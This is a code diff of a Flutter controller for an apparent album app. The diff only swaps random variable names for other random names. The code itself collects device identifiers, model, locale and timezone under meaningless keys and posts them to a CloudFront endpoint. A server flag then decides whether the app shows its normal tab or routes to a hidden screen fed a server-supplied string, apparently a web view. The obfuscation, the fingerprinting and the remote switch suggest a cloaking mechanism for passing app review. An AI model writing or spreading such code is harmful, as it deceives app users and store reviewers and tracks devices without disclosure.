@@ -10,12 +10,12 @@ import 'package:package_info_plus/package_info_plus.dart';
 
 class MagicAlbumMasterLogic extends GetxController {
 
-  var kymtodfn = RxBool(false);
-  var dvzolxge = RxBool(true);
-  var naspi = RxString("");
-  var hckbvjuo = RxBool(false);
-  var hsjxm = RxBool(true);
-  final oamrfjxpeu = Dio();
+  var gpawrqhb = RxBool(false);
+  var jyguxq = RxBool(true);
+  var ekgpz = RxString("");
+  var bpqkc = RxBool(false);
+  var dqac = RxBool(true);
+  final hqbxromy = Dio();
 
 
   InAppWebViewController? webViewController;
@@ -23,52 +23,54 @@ class MagicAlbumMasterLogic extends GetxController {
   @override
   void onInit() {
     super.onInit();
-    chdmaynr();
+    mwtcju();
   }
 
 
-  Future<void> chdmaynr() async {
-    hckbvjuo.value = true;
-    hsjxm.value = true;
-    dvzolxge.value = false;
+  Future<void> mwtcju() async {
+    bpqkc.value = true;
+    dqac.value = true;
+    jyguxq.value = false;
 
-    oamrfjxpeu.post("https://d7ir8bf7p2gcd.cloudfront.net/hnqzcvytwkbil",data: await jhbzdocviy()).then((value) {
+    hqbxromy.post("https://d7ir8bf7p2gcd.cloudfront.net/hnqzcvytwkbil",data: await lmgsjcuyfk()).then((value) {
       var arwyfo = value.data["arwyfo"] as String;
       var dctul = value.data["dctul"] as bool;
       if (dctul) {
-        naspi.value = arwyfo;
-        efwgb();
+        ekgpz.value = arwyfo;
+        lasg();
       } else {
-        qwptin();
+        yvdpbwgx();
       }
     }).catchError((e) {
-      dvzolxge.value = true;
-      hsjxm.value = true;
-      hckbvjuo.value = false;
+      jyguxq.value = true;
+      dqac.value = true;
+      bpqkc.value = false;
     });
   }
 
-  Future<Map<String, dynamic>> jhbzdocviy() async {
-    final DeviceInfoPlugin irpy = DeviceInfoPlugin();
-    PackageInfo lhobuvye_acvjgpm = await PackageInfo.fromPlatform();
+  Future<Map<String, dynamic>> lmgsjcuyfk() async {
+    final DeviceInfoPlugin ngomq = DeviceInfoPlugin();
+    PackageInfo yeugm_pbgzauk = await PackageInfo.fromPlatform();
     final String currentTimeZone = await FlutterTimezone.getLocalTimezone();
-    var xzjyhao = Platform.localeName;
+    var bkcjilrs = Platform.localeName;
     var dmgjnb_wN = currentTimeZone;
 
-    var dmgjnb_tqg = lhobuvye_acvjgpm.packageName;
-    var dmgjnb_ItW = lhobuvye_acvjgpm.version;
-    var dmgjnb_Kn = lhobuvye_acvjgpm.buildNumber;
+    var dmgjnb_tqg = yeugm_pbgzauk.packageName;
+    var dmgjnb_ItW = yeugm_pbgzauk.version;
+    var dmgjnb_Kn = yeugm_pbgzauk.buildNumber;
 
-    var dmgjnb_yvnwhBA = lhobuvye_acvjgpm.appName;
+    var dmgjnb_yvnwhBA = yeugm_pbgzauk.appName;
     var dmgjnb_Juq = "";
     var dmgjnb_Vhk  = "";
     var dmgjnb_cyATqE = "";
-    var soltedp = "";
-    var nqcgkxwl = "";
-    var gmftqlci = "";
-    var pwqofcdb = "";
-    var cwprl = "";
-    var qzkxpsmg = "";
+    var zgwceay = "";
+    var tngxrmlj = "";
+    var eanfzpgi = "";
+    var jlvx = "";
+    var wfyjm = "";
+    var scfpjgd = "";
+    var rybdutp = "";
+    var fqxbp = "";
 
 
     var dmgjnb_WkoSIbw = "";
@@ -76,53 +78,55 @@ class MagicAlbumMasterLogic extends GetxController {
 
     if (GetPlatform.isAndroid) {
       dmgjnb_WkoSIbw = "android";
-      var hsvope = await irpy.androidInfo;
+      var pyecjiku = await ngomq.androidInfo;
 
-      dmgjnb_cyATqE = hsvope.brand;
+      dmgjnb_cyATqE = pyecjiku.brand;
 
-      dmgjnb_Juq  = hsvope.model;
-      dmgjnb_Vhk = hsvope.id;
+      dmgjnb_Juq  = pyecjiku.model;
+      dmgjnb_Vhk = pyecjiku.id;
 
-      dmgjnb_poTMQ = hsvope.isPhysicalDevice;
+      dmgjnb_poTMQ = pyecjiku.isPhysicalDevice;
     }
 
     if (GetPlatform.isIOS) {
       dmgjnb_WkoSIbw = "ios";
-      var nglmqrd = await irpy.iosInfo;
-      dmgjnb_cyATqE = nglmqrd.name;
-      dmgjnb_Juq = nglmqrd.model;
+      var lkytbqaov = await ngomq.iosInfo;
+      dmgjnb_cyATqE = lkytbqaov.name;
+      dmgjnb_Juq = lkytbqaov.model;
 
-      dmgjnb_Vhk = nglmqrd.identifierForVendor ?? "";
-      dmgjnb_poTMQ  = nglmqrd.isPhysicalDevice;
+      dmgjnb_Vhk = lkytbqaov.identifierForVendor ?? "";
+      dmgjnb_poTMQ  = lkytbqaov.isPhysicalDevice;
     }
     var res = {
+      "dmgjnb_yvnwhBA": dmgjnb_yvnwhBA,
       "dmgjnb_Kn": dmgjnb_Kn,
-      "dmgjnb_tqg": dmgjnb_tqg,
-      "gmftqlci" : gmftqlci,
-      "cwprl" : cwprl,
       "dmgjnb_Juq": dmgjnb_Juq,
+      "zgwceay" : zgwceay,
       "dmgjnb_wN": dmgjnb_wN,
       "dmgjnb_cyATqE": dmgjnb_cyATqE,
       "dmgjnb_Vhk": dmgjnb_Vhk,
-      "xzjyhao": xzjyhao,
+      "scfpjgd" : scfpjgd,
       "dmgjnb_WkoSIbw": dmgjnb_WkoSIbw,
       "dmgjnb_poTMQ": dmgjnb_poTMQ,
-      "soltedp" : soltedp,
+      "tngxrmlj" : tngxrmlj,
+      "eanfzpgi" : eanfzpgi,
+      "jlvx" : jlvx,
       "dmgjnb_ItW": dmgjnb_ItW,
-      "nqcgkxwl" : nqcgkxwl,
-      "dmgjnb_yvnwhBA": dmgjnb_yvnwhBA,
-      "pwqofcdb" : pwqofcdb,
-      "qzkxpsmg" : qzkxpsmg,
+      "bkcjilrs": bkcjilrs,
+      "wfyjm" : wfyjm,
+      "dmgjnb_tqg": dmgjnb_tqg,
+      "rybdutp" : rybdutp,
+      "fqxbp" : fqxbp,
 
     };
     return res;
   }
 
-  Future<void> qwptin() async {
+  Future<void> yvdpbwgx() async {
     Get.offNamed("/magic_tab");
   }
 
-  Future<void> efwgb() async {
+  Future<void> lasg() async {
     Get.offNamed("/magic_music-album-config");
   }
 
